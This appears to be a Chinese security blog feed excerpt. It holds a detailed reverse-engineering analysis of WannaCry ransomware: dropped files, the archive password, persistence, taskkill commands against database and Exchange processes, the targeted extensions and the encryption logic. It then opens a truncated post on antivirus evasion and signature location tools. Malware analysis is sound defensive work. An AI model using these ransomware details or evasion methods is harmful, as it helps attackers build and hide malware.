<p>由于没有拿到初始样本，没有包含漏洞利用部分的分析。</p>
<p>样本信息：</p>
<blockquote>
<p>MD5: 84C82835A5D21BBCF75A61706D8AB549</p>
<p>SHA1: 5FF465AFAABCBF0150D1A3AB2C2E74F3A4426467</p>
<p>CRC32: 4022FCAA</p>
<p>无壳 / Visual C++ 6.0</p>
</blockquote>
<p>下面具体看分析内容。</p>
<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01. 概述"></a>0x01. 概述</h1><ol>
<li>样本首先通过资源释放各种文件，包括加密器、解密器、几个辅助程序、桌面背景图、说明文件、语言文件等等。</li>
<li>内存加载加密器模块，执行加密部分功能。</li>
<li>枚举目标文件（目标文件后缀列表后面给出），加密为.WNCRY文件（加密策略后面详述），删除原始文件。</li>
<li>复制自身为tasksche.exe，安装启动项</li>
<li>启动解密器</li>
</ol>
<p>大致流程图如图：</p>
<p><img src="/img/wannacry/00.png" alt="img"></p>
<p>下面开始详细分析各个部分细节。</p>
<h1 id="0x02-释放文件"><a href="#0x02-释放文件" class="headerlink" title="0x02. 释放文件"></a>0x02. 释放文件</h1><p>设置当前目录为工作目录，然后查找PE中资源(XIA)。</p>
<p><img src="/img/wannacry/1_0.png" alt="img"></p>
<p>直接用资源工具看一下，发现是PK开头的，多半是个压缩文件了，导出来试试。</p>
<p><img src="/img/wannacry/1_1.png" alt="img"></p>
<p>解压还要密码，看代码密码是WNcry@2ol7，解压成功。</p>
<p><img src="/img/wannacry/1_3.png" alt="img"></p>
<p>读取资源数据后，解压释放文件到当前目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//部分释放文件说明：</span><br><span class="line">b.wnry      //桌面背景图片</span><br><span class="line">c.wnry      //加密相关</span><br><span class="line">msg/*.wnry  //语言相关文件</span><br><span class="line">r.wnry      //@Please_Read_Me@.txt</span><br><span class="line">s.wnry      //是压缩文件，打包的是Tor相关组件</span><br><span class="line"></span><br><span class="line">taskdl.exe  //删除回收站文件</span><br><span class="line">taskse.exe  //用于启动其他session的@WanaDecryptor@.exe</span><br><span class="line"></span><br><span class="line">u.wnry      //@WanaDecryptor@.exe 解密器 </span><br><span class="line">t.wnry      //解密后是加密器</span><br></pre></td></tr></table></figure>
<p>在三个比特币交易地址中随机选择一个，写入c.wnry</p>
<p><img src="/img\wannacry\1_6.png" alt="img"></p>
<p>然后设置当前目录为隐藏属性，且设置为everyone可访问</p>
<p><img src="/img/wannacry/1_2.png" alt="img"></p>
<p>然后初始化Crypt相关函数，用于后面的解密操作。</p>
<p>开始操作文件t.wnry，看看内容，应该是个加密文件。</p>
<p><img src="/img/wannacry/1_4.png" alt="img"></p>
<p>然后通过crypt API将t.wnry解密之后（解密后是个DLL模块，dump数据后可以用于分析），映射到内存（自己loaddll），然后找到导出接口函数TaskStart调用，开始加密工作。</p>
<p><img src="/img/wannacry/1_5.png" alt="img"></p>
<h1 id="0x03-加密部分"><a href="#0x03-加密部分" class="headerlink" title="0x03. 加密部分"></a>0x03. 加密部分</h1><p>TaskStart一进来，通过MsWinZonesCacheCounterMutexA的Mutex进行单示例检查，有则退出，没有继续工作。</p>
<p>然后是设置工作目录，读取c.wnry信息。</p>
<p>检查是否是SYSTEM账户。</p>
<p><img src="/img\wannacry\3_0.png" alt="img"></p>
<p>初始化Crypt相关函数，以及文件操作函数（增加一点分析成本）。</p>
<p><img src="/img\wannacry\3_1.png" alt="img"><br><img src="/img\wannacry\3_2.png" alt="img"></p>
<p>检查Global\MsWinZonesCacheCounterMutexW，Global\MsWinZonesCacheCounterMutexA\0是否存在，</p>
<p>存在则表示加密相关准备工作已经完成，不在进行，没有则创建Global\MsWinZonesCacheCounterMutexA\0</p>
<p>检查00000000.dky和00000000.pky是否存在，存在是否配对的密钥，是则加密相关准备工作已经完成，不在进行，没有则进行后续工作。</p>
<p><img src="/img\wannacry\3_6.png" alt="img"></p>
<p>如果加密相关准备工作已经完成，创建一个线程，完成如下工作（记为工作A）：</p>
<p>a). 如果不是管理员权限，并且不是SYSTEM账户，通过taskse.exe提权启动@WanaDecryptor@.exe，是则普通方式启动@WanaDecryptor@.exe</p>
<p><img src="/img\wannacry\3_3.png" alt="img"></p>
<p>b). 安装tasksche.exe启动项（注册表Run），键名随机</p>
<p><img src="/img\wannacry\3_4.png" alt="img"></p>
<p>如果加密准备未完成，初始化密钥，保存到00000000.pky, 00000000.eky。</p>
<blockquote>
<p>由于时间关系，具体加密密钥产生过程不再详述，很多分析文章说的很清楚了，本文重点不在此。</p>
</blockquote>
<p>然后是如果00000000.res不存在，通过CryptGenRandom产生8字节随机值，后续会写入00000000.res</p>
<p>接着创建5个工作线程，完成不同的工作。</p>
<p>a). 线程1每隔25秒循环写入数据到00000000.res，包括前面CryptGenRandom生成的随机值，已经更新的当前时间，直到线程退出标记为真退出</p>
<p><img src="/img\wannacry\3_5.png" alt="img"></p>
<p>b). 线程2每5秒检查00000000.dky和00000000.pky是否存在，存在是否配对的密钥，是则设置全局标志，然后退出线程</p>
<p><img src="/img\wannacry\3_7.png" alt="img"></p>
<p>c). 线程3监测新增磁盘，加密新磁盘的文件（和其他磁盘加密相同）</p>
<p><img src="/img\wannacry\3_8.png" alt="img"></p>
<p>d). 线程4每30秒启动taskdl.exe清除所有磁盘的回收站文件</p>
<p>e). 线程5完成的也是前面提到的工作A的内容，不再详述</p>
<p>然后就是重点了，加密文件部分了。</p>
<h2 id="加密文件部分"><a href="#加密文件部分" class="headerlink" title="加密文件部分"></a>加密文件部分</h2><p>拷贝u.wnry为@WanaDecryptor@.exe，通过写一个bat创建@WanaDecryptor@.exe.lnk快捷方式。</p>
<p><img src="/img\wannacry\3_9.png" alt="img"></p>
<p><img src="/img\wannacry\2_11.png" alt="img"></p>
<p>读取r.wnry内容，生成@Please_Read_Me@.txt文件。</p>
<p>枚举当前用户桌面和文档目录文件，进行加密（没有设置不复写标记，删除前会复写）。</p>
<p>枚举All Users\Desktop和All Users\Documents，找到非当前用户目录进行加密（没有设置不复写标记，删除前会复写）。</p>
<p>下面记为工作B:</p>
<p>通过taskkill强删Microsoft.Exchange、sql和mysql进程（加密其数据）</p>
<blockquote>
<p>anhkgg_CreateProc_10001080(aTaskkill_exeFI, 0, 0);// taskkill.exe /f /im Microsoft.Exchange.<em><br>anhkgg_CreateProc_10001080(aTaskkill_exe_0, 0, 0);// taskkill.exe /f /im MSExchange</em><br>anhkgg_CreateProc_10001080(aTaskkill_exe_1, 0, 0);// ‘taskkill.exe /f /im sqlserver.exe<br>anhkgg_CreateProc_10001080(aTaskkill_exe_2, 0, 0);// taskkill.exe /f /im sqlwriter.exe<br>anhkgg_CreateProc_10001080(aTaskkill_exe_3, 0, 0);// taskkill.exe /f /im mysqld.exe</p>
</blockquote>
<p>加密磁盘中文件，每个分区重复两次（会设置不复写标记，删除前不会复写）。</p>
<p>枚举All Users\Desktop目录，复制b.wnry到目录中为@WanaDecryptor@.bmp，设置桌面背景为@WanaDecryptor@.bmp，</p>
<p>执行@WanaDecryptor@.exe co</p>
<p>更新00000000.res</p>
<p>cmd.exe /c start /b @WanaDecryptor@.exe vs</p>
<p>每个磁盘(fixed)创建x:/$Recycle/hibsys.WNCRYT（系统盘写在temp目录，x:/$Recycle被设置为系统隐藏属性），读取分区可用空间大小，大于0x40000000（1GB）的话，每10微秒循环写入0xa00000个字节的’U’，写20次，然后删除该文件，并且设置了重启后删除。</p>
<p>每隔60s重复工作B，直到退出标志为真。</p>
<h2 id="文件枚举"><a href="#文件枚举" class="headerlink" title="文件枚举"></a>文件枚举</h2><p>枚举文件采用方式为：</p>
<ol>
<li>枚举当前目录中所有文件(排除文件看下文)，加入文件链表，记录所有子目录（排除目录看下文）到目录链表。</li>
<li>本目录文件有加密操作（具体看下文）</li>
<li>分析目录层级，少于等于6层的，拷贝lease_Read_Me@.txt到目录，5-6层的拷贝@WanaDecryptor@.exe.lnk，1-4层拷贝@WanaDecryptor@.exe到目录。</li>
<li>然后遍历目录链表，枚举子目录，重复1操作。</li>
<li>子目录枚举完成，所有文件记录到链表，进行后续操作。</li>
</ol>
<p>目录和文件采用相同的链表结果，总结如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">struct FILE_LIST_CONTEXT</span><br><span class="line">&#123;</span><br><span class="line">    DWORD vtable;</span><br><span class="line">    FILE_LIST *list;//</span><br><span class="line">    DWORD file_count;//8</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct FILE_LIST</span><br><span class="line">&#123;</span><br><span class="line">    FILE_LIST* prev;</span><br><span class="line">    FILE_LIST* next;</span><br><span class="line">    FILE_INFO file;//8</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct FILE_INFO</span><br><span class="line">&#123;</span><br><span class="line">    WCHAR path[0x168];//</span><br><span class="line">    WCHAR name[0x104];//2d0</span><br><span class="line">    DWORD nFileSizeLow;//4d8</span><br><span class="line">    DWORD nFileSizeHigh;//4dc</span><br><span class="line">    DWORD type;//4e0  FILE_TYPE</span><br><span class="line">&#125;//0x4e4</span><br></pre></td></tr></table></figure>
<h2 id="排除目录"><a href="#排除目录" class="headerlink" title="排除目录"></a>排除目录</h2><p>枚举子目录时，会跳过如下目录（保证系统正常工作）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">\Intel </span><br><span class="line">\ProgramData</span><br><span class="line">\WINDOWS</span><br><span class="line">\Program Files</span><br><span class="line">\Program Files (x86)</span><br><span class="line">\AppData\Local\Temp</span><br><span class="line">\Local Settings\Temp</span><br><span class="line">This folder protects against ransomware. Modifying it will reduce protection</span><br><span class="line">Temporary Internet Files</span><br><span class="line">Content.IE5</span><br></pre></td></tr></table></figure>
<h2 id="文件分类"><a href="#文件分类" class="headerlink" title="文件分类"></a>文件分类</h2><p>枚举文件时，首先跳过 @Please_Read_Me@.txt，@WanaDecryptor@.exe.lnk， @WanaDecryptor@.bmp</p>
<p>然后检查文件类型，跳过0,1,6类型文件，其他文件加入链表。</p>
<p>具体类型如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0 没有后缀以及其他类型后缀</span><br><span class="line">1 .exe, .dll</span><br><span class="line">4 .WNCRYT </span><br><span class="line">5 .WNCYR</span><br><span class="line">6 .WNCRY</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">&quot;.doc&quot;&quot;.docx&quot;&quot;.xls&quot;&quot;.xlsx&quot;&quot;.ppt&quot;&quot;.pptx&quot;&quot;.pst&quot;&quot;.ost&quot;&quot;.msg&quot;&quot;.eml&quot;&quot;.vsd&quot;&quot;.vsdx&quot;</span><br><span class="line">&quot;.txt&quot;&quot;.csv&quot;&quot;.rtf&quot;&quot;.123&quot;&quot;.wks&quot;&quot;.wk1&quot;&quot;.pdf&quot;&quot;.dwg&quot;&quot;.onetoc2&quot;&quot;.snt&quot;&quot;.jpeg&quot;&quot;.jpg&quot;</span><br><span class="line"></span><br><span class="line">3. </span><br><span class="line">&quot;.docb&quot;&quot;.docm&quot;&quot;.dot&quot;&quot;.dotm&quot;&quot;.dotx&quot;&quot;.xlsm&quot;&quot;.xlsb&quot;&quot;.xlw&quot;&quot;.xlt&quot;&quot;.xlm&quot;&quot;.xlc&quot;&quot;.xltx&quot;&quot;.xltm&quot;&quot;.pptm&quot;&quot;.pot&quot;&quot;.pps&quot;&quot;.ppsm&quot;&quot;.ppsx&quot;&quot;.ppam&quot;&quot;.potx&quot;&quot;.potm&quot;</span><br><span class="line">&quot;.edb&quot;&quot;.hwp&quot;&quot;.602&quot;&quot;.sxi&quot;&quot;.sti&quot;&quot;.sldx&quot;&quot;.sldm&quot;&quot;.sldm&quot;&quot;.vdi&quot;&quot;.vmdk&quot;&quot;.vmx&quot;&quot;.gpg&quot;&quot;.aes&quot;&quot;.ARC&quot;&quot;.PAQ&quot;&quot;.bz2&quot;&quot;.tbk&quot;&quot;.bak&quot;&quot;.tar&quot;&quot;.tgz&quot;&quot;.gz&quot;&quot;.7z&quot;&quot;.rar&quot;</span><br><span class="line">&quot;.zip&quot;&quot;.backup&quot;&quot;.iso&quot;&quot;.vcd&quot;&quot;.bmp&quot;&quot;.png&quot;&quot;.gif&quot;&quot;.raw&quot;&quot;.cgm&quot;&quot;.tif&quot;&quot;.tiff&quot;&quot;.nef&quot;&quot;.psd&quot;&quot;.ai&quot;&quot;.svg&quot;&quot;.djvu&quot;&quot;.m4u&quot;&quot;.m3u&quot;&quot;.mid&quot;&quot;.wma&quot;&quot;.flv&quot;&quot;.3g2&quot;&quot;.mkv&quot;</span><br><span class="line">&quot;.3gp&quot;&quot;.mp4&quot;&quot;.mov&quot;&quot;.avi&quot;&quot;.asf&quot;&quot;.mpeg&quot;&quot;.vob&quot;&quot;.mpg&quot;&quot;.wmv&quot;&quot;.fla&quot;&quot;.swf&quot;&quot;.wav&quot;&quot;.mp3&quot;&quot;.sh&quot;&quot;.class&quot;&quot;.jar&quot;&quot;.java&quot;&quot;.rb&quot;&quot;.asp&quot;&quot;.php&quot;&quot;.jsp&quot;&quot;.brd&quot;&quot;.sch&quot;</span><br><span class="line">&quot;.dch&quot;&quot;.dip&quot;&quot;.pl&quot;&quot;.vb&quot;&quot;.vbs&quot;&quot;.ps1&quot;&quot;.bat&quot;&quot;.cmd&quot;&quot;.js&quot;&quot;.asm&quot;&quot;.h&quot;&quot;.pas&quot;&quot;.cpp&quot;&quot;.c&quot;&quot;.cs&quot;&quot;.suo&quot;&quot;.sln&quot;&quot;.ldf&quot;&quot;.mdf&quot;&quot;.ibd&quot;&quot;.myi&quot;&quot;.myd&quot;&quot;.frm&quot;&quot;.odb&quot;&quot;.dbf&quot;</span><br><span class="line">&quot;.db&quot;&quot;.mdb&quot;&quot;.accdb&quot;&quot;.sql&quot;&quot;.sqlitedb&quot;&quot;.sqlite3&quot;&quot;.asc&quot;&quot;.lay6&quot;&quot;.lay&quot;&quot;.mml&quot;&quot;.sxm&quot;&quot;.otg&quot;&quot;.odg&quot;&quot;.uop&quot;&quot;.std&quot;&quot;.sxd&quot;&quot;.otp&quot;&quot;.odp&quot;&quot;.wb2&quot;&quot;.slk&quot;&quot;.dif&quot;&quot;.stc&quot;</span><br><span class="line">&quot;.sxc&quot;&quot;.ots&quot;&quot;.ods&quot;&quot;.3dm&quot;&quot;.max&quot;&quot;.3ds&quot;&quot;.uot&quot;&quot;.stw&quot;&quot;.sxw&quot;&quot;.ott&quot;&quot;.odt&quot;&quot;.pem&quot;&quot;.p12&quot;&quot;.csr&quot;&quot;.crt&quot;&quot;.key&quot;&quot;.pfx&quot;&quot;.der&quot;</span><br></pre></td></tr></table></figure>
<p>总结为下面的enum</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">enum FILE_TYPE</span><br><span class="line">&#123;</span><br><span class="line">    FILE_TYPE_NULL = 0,</span><br><span class="line">    FILE_TYPE_EXEDLL,</span><br><span class="line">    FILE_TYPE_DOC,</span><br><span class="line">    FILE_TYPE_DOCEX,</span><br><span class="line">    FILE_TYPE_WNCRYT, //.wncryt</span><br><span class="line">    FILE_TYPE_WNCYR, //.wncyr</span><br><span class="line">    FILE_TYPE_WNCRY //.wncry</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件加密策略"><a href="#文件加密策略" class="headerlink" title="文件加密策略"></a>文件加密策略</h2><p>加密文件函数中有个参数，我取做cmd（取值是1-4）。因为不同的值会有不同的操作方式。</p>
<p>根据cmd和文件类型和大小等等，函数<code>sub_10002E70</code>返回不同的操作方式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1. cmd&gt;=4, FOT_ENCRYPT_NORMAL_4</span><br><span class="line">2. cmd&lt;=3，FILE_TYPE_NULL，FOT_NULL_1 </span><br><span class="line">3. cmd==3, 非FILE_TYPE_NULL，FOT_ENCRYPT_NORMAL_4</span><br><span class="line">4. cmd&lt;=2, .wncyr, FOT_NULL_1</span><br><span class="line">5. cmd&lt;=2, .wncryt, FOT_DELETE_FILE_2</span><br><span class="line"></span><br><span class="line">//用于枚举中的操作，直接操作普通文件（不加入链表）和大文件.doc（加入链表），小文件.doc,.docex加入链表，其他文件不加入链表</span><br><span class="line">//枚举中完成加密操作的文件不加入链表了</span><br><span class="line">6. cmd==1, .doc, 大文件, FOT_ENCRYPT_WRITESRC_3 //也要加入链表</span><br><span class="line">7. cmd==1, .doc, 普通文件, FOT_ENCRYPT_NORMAL_4</span><br><span class="line">8. cmd==1, .doc, 小文件，FOT_NULL_1</span><br><span class="line">9. cmd==1, .docex, FOT_NULL_1</span><br><span class="line"></span><br><span class="line">10. cmd==2, .doc, FOT_NULL_1</span><br><span class="line">11. cmd==2, .docex, 大文件， FOT_ENCRYPT_WRITESRC_3</span><br><span class="line">12. cmd==2, .docex, 小文件，FOT_NULL_1</span><br><span class="line">13. cmd==2, .docex, 普通文件，FOT_ENCRYPT_NORMAL_4</span><br><span class="line"></span><br><span class="line">其他返回FOT_NULL_0</span><br></pre></td></tr></table></figure>
<p>上面提到的大文件，普通文件，小文件定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小于0x400的是小文件，大于0xC800000的是大文件，中间的是普通文件</span><br></pre></td></tr></table></figure>
<p><img src="/img\wannacry\4_0.png" alt="img"></p>
<p>上面提到的作方式具体定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//返回0表示未作处理，或者处理未完成，需要插入链表或者不从链表中删除</span><br><span class="line">enum FILE_OP_TYPE&#123;</span><br><span class="line">    FOT_NULL_0 = 0,     //0 未操作，返回1</span><br><span class="line">    FOT_NULL_1,         //1,default 未操作，返回0</span><br><span class="line">    FOT_DELETE_FILE_2,    //2 //删除文件，返回1</span><br><span class="line">    FOT_ENCRYPT_WRITESRC_3, //3 改源文件，返回0</span><br><span class="line">    FOT_ENCRYPT_NORMAL_4, //4 只加密，返回1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>代码如下：</p>
<p><img src="/img\wannacry\4_1.png" alt="img"></p>
<p>对加密策略做一下总结：<br>a). 在枚举文件中，cmd=1，会对普通文件直接加密为.WNCRY，不再加入链表，大文件处理为.WNCYR，以及其他未作处理文件继续加入链表等待处理。</p>
<p><img src="/img\wannacry\4_2.png" alt="img"></p>
<p>b). 枚举完成后，cmd从2-4，每个cmd遍历都遍历加密文件。</p>
<ul>
<li>cmd=2，加密FILE_TYPE_DOCEX普通文件为.WNCRY（移出链表），以及FILE_TYPE_DOCEX大文件为.WNCYR。</li>
<li>cmd=2, 删除.WNCRYT</li>
<li>cmd=3, 加密链表中所有文件（移出链表）</li>
<li>cmd=4, 加密可能剩余链表中的文件</li>
</ul>
<p><img src="/img\wannacry\4_3.png" alt="img"></p>
<h2 id="文件内容加密过程"><a href="#文件内容加密过程" class="headerlink" title="文件内容加密过程"></a>文件内容加密过程</h2><p>验证文件是否未加密，或者未加密完成。已完成加密，直接退出。</p>
<p><img src="/img\wannacry\4_5.png" alt="img"></p>
<p>对于FOT_ENCRYPT_WRITESRC_3，按写打开源文件，将文件头0x10000字节内容移动到尾部，头部内容清零，写入加密文件头部数据，然后源文件移动为.WNCYR，完成退出。</p>
<p><img src="/img\wannacry\4_4.png" alt="img"></p>
<p>对于FOT_ENCRYPT_NORMAL_4，按读打开源文件，对于普通文件进行随机值检查，满足100倍数，且文件数据小于10，那么换本次加密算法为免费解密的算法，标记，加密完成后调用回调函数写入f.wnry中。</p>
<p><img src="/img\wannacry\4_6.png" alt="img"><br><img src="/img\wannacry\4_7.png" alt="img"></p>
<p>加密前，将文件后缀加上T变成.WNCRYT，然后创建文件。</p>
<p>写入加密文件头部数据</p>
<p><img src="/img\wannacry\4_8.png" alt="img"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//加密文件头部数据结构</span><br><span class="line">struct </span><br><span class="line">&#123;</span><br><span class="line">    char magic[8];//WANACRY!&apos;</span><br><span class="line">    int size;//0x100</span><br><span class="line">    char key[size];//</span><br><span class="line">    int type;//加密文件类型3,4</span><br><span class="line">    __int64 datasize;// &lt;=0x6400000 源文件大小</span><br><span class="line">    char data[1];//</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对于.WNCYR文件（FOT_ENCRYPT_WRITESRC_3处理过一次），读取尾部0x10000的数据加密写入文件。</p>
<p><img src="/img\wannacry\4_9.png" alt="img"></p>
<p>然后每0x1000读取加密，写入.WNCRYT文件，循环直到所有数据加密。移动.WNCRYT为.WNCRT。</p>
<p><img src="/img\wannacry\4_10.png" alt="img"></p>
<p>对于FOT_ENCRYPT_NORMAL_4，加密完成后会将源文件加入删除链表，在删除线程中文件会被复写删除。</p>
<p>复写通过生成随机值或者一片’U’，循环写入文件，细节不再阐述（桌面我的文档目录文件目录会被复写，其他目录文件不会）。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>至此，wannacry大部分内容都分析完成，由于时间精力的关系，后续解密器就不再分析了。<br>最后说一句，现在这个时代不再适合裸奔！！！</p>
<p>转载请注明出处：<a href="https://anhkgg.github.io/wannacry-analyze-report">https://anhkgg.github.io/wannacry-analyze-report</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 前言&quot;&gt;&lt;/a&gt;0x00. 前言&lt;/h1&gt;&lt;p&gt;最近，WannaCry是火了一把，到处都是分析文章，报告，解决方案等等。&lt;/p&gt;
&lt;p&gt;趁着这个热度，我也来跟风一把。&lt;/p&gt;
&lt;p&gt;前前后后把WannaCry详细分析了一遍。&lt;/p&gt;
&lt;p&gt;从文件释放、启动加密器、文件加密策略、加密算法、到解密过程中所有细节进行了详尽深入的分析。&lt;/p&gt;
    
    </summary>
    
      <category term="Security" scheme="https://anhkgg.github.io/categories/Security/"/>
    
    
      <category term="wannacry" scheme="https://anhkgg.github.io/tags/wannacry/"/>
    
      <category term="比特币病毒" scheme="https://anhkgg.github.io/tags/%E6%AF%94%E7%89%B9%E5%B8%81%E7%97%85%E6%AF%92/"/>
    
      <category term="逆向分析" scheme="https://anhkgg.github.io/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
      <category term="样本分析" scheme="https://anhkgg.github.io/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
      <category term="locky" scheme="https://anhkgg.github.io/tags/locky/"/>
    
  </entry>
  
  <entry>
    <title>免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)</title>
    <link href="https://anhkgg.github.io/aanti-virus/"/>
    <id>https://anhkgg.github.io/aanti-virus/</id>
    <published>2017-05-22T00:07:45.000Z</published>
    <updated>2017-05-22T00:14:21.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="00-概述"><a href="#00-概述" class="headerlink" title="00. 概述"></a>00. 概述</h1><p>什么是免杀？来自百科的注解：</p>
<blockquote>
<p>免杀，也就是反病毒（AntiVirus）与反间谍（AntiSpyware）的对立面，英文为Anti-AntiVirus（简写Virus AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”。</p>
</blockquote>
<p>有本比较有名的书，想详细学习的同学可以去看看。《黑客免杀攻防》</p>
<blockquote>
<p>其实我大概好像只看过目录…( ╯□╰ )</p>
</blockquote>
<p>下面我介绍的是自己实践的一些方法，有没有效果，试试就知道了。</p>
<a id="more"></a>
<h1 id="01-简介"><a href="#01-简介" class="headerlink" title="01. 简介"></a>01. 简介</h1><p>免杀大概可以分为两种情况：</p>
<ol>
<li>二进制的免杀（无源码），只能通过通过修改asm代码／二进制数据／其他数据来完成免杀。</li>
<li>有源码的免杀，可以通过修改源代码来完成免杀，也可以结合二进制免杀的技术。</li>
</ol>
<p>免杀也可以分为这两种情况：</p>
<ol>
<li>静态文件免杀，被杀毒软件病毒库/云查杀了，也就是文件特征码在病毒库了。免杀方式可能是上面的两种方式，看情况。</li>
<li>动态行为免杀，运行中执行的某些行为被杀毒软件拦截报读。行为免杀如果没有源码就不是很好搞了。</li>
</ol>
<p>下面就静态和动态免杀来详细说说免杀的技术。</p>
<h1 id="02-静态免杀"><a href="#02-静态免杀" class="headerlink" title="02. 静态免杀"></a>02. 静态免杀</h1><p>对于静态免杀，针对的是杀毒软件的静态文件扫描，云查（病毒库）杀。</p>
<p>杀毒是提取文件一段特征码来识别病毒文件。</p>
<blockquote>
<p>能识别一个程序是一个病毒的一段不大于64字节的特征串</p>
</blockquote>
<p>那杀毒软件是怎么提取文件特征码的？</p>
<p>如果我们知道了一个文件是病毒，那么通过md5肯定可以判断一个就是这个病毒文件，那如果该病毒文件做了小小变动呢，直接md5肯定是不行了，那杀毒软件是怎么做的呢？这里有个叫做模糊哈希（<code>Fuzzy Hashing</code>）算法的东西。</p>
<blockquote>
<p>模糊哈希算法又叫基于内容分割的分片分片哈希算法（context triggered piecewise hashing, CTPH），主要用于文件的相似性比较。</p>
</blockquote>
<p>大致就可以理解为，不要把一个文件的所有内容都拿来计算hash，而通过分片，取出部分重要（不易改变）的内容进行hash计算，这样就能达到通过一个特征码找到类似的病毒变种。</p>
<p>关于模糊哈希更加详细的内容可以查看文章后面的参考文章，这里不再详述。</p>
<p>具体杀毒软件是不是通过这个算法来计算特征码的，我也不能完全肯定（纯猜测加网上一点点信息），但是根据免杀的经验可以总结出几点：</p>
<ol>
<li>特征码会有多个串组合（减少误报）</li>
<li>代码数据（肯定有）</li>
<li>会解析PE，检查附加文件数据、PE文件的资源等等</li>
</ol>
<h2 id="1-怎么找特征码"><a href="#1-怎么找特征码" class="headerlink" title="1. 怎么找特征码"></a>1. 怎么找特征码</h2><h3 id="工具查找"><a href="#工具查找" class="headerlink" title="工具查找"></a>工具查找</h3><p>常见的特征码定位工具有CCL、MYCCL。工具大致原理就是分割文件，某些分割部分填入数据(0)，如果扫描该部分不报警，则特征码在这个部分。如此反复，直到找到很短的某一段内容。不同工具之前局别是使用的分割算法不同，查找特征码的效果不同。</p>
<blockquote>
<p>目前比较常有名气的特征码定位器主要有CCL与MYCCL，他们都采用文件分块定位的办法，定位效果带有运气成份，且可能每次定位出的位置都不尽相同，这个免杀带来了困难。</p>
</blockquote>
<p>后来出来了一款新的特征码定位软件<code>VirTest</code>。下面是作者自己的介绍：</p>
<blockquote>
<p>我们可以这样假设报毒过程，如果检测文件是PE,如果在CODE位置存在 标志A,在DATA位置存在标志B,在资源位置存在标志C,同时满足这个3个条件，那么杀软就会报毒,VIRTEST工作原理就是要找到引起报毒最后一个标志，也就是假设中的标志C。</p>
<p>因此VIRTEST采用2分排除法，测试标志C所在文件中的位置，由于被杀的文件可能存在多个 类似于ABC这样的连锁条件，所以我们必须要通过一种排除机制，先要找最靠近文件前部的连锁条件，排除掉文件尾部数据，当找到第一个连锁条件后，抹掉引标志C，再恢复尾部数据，</p>
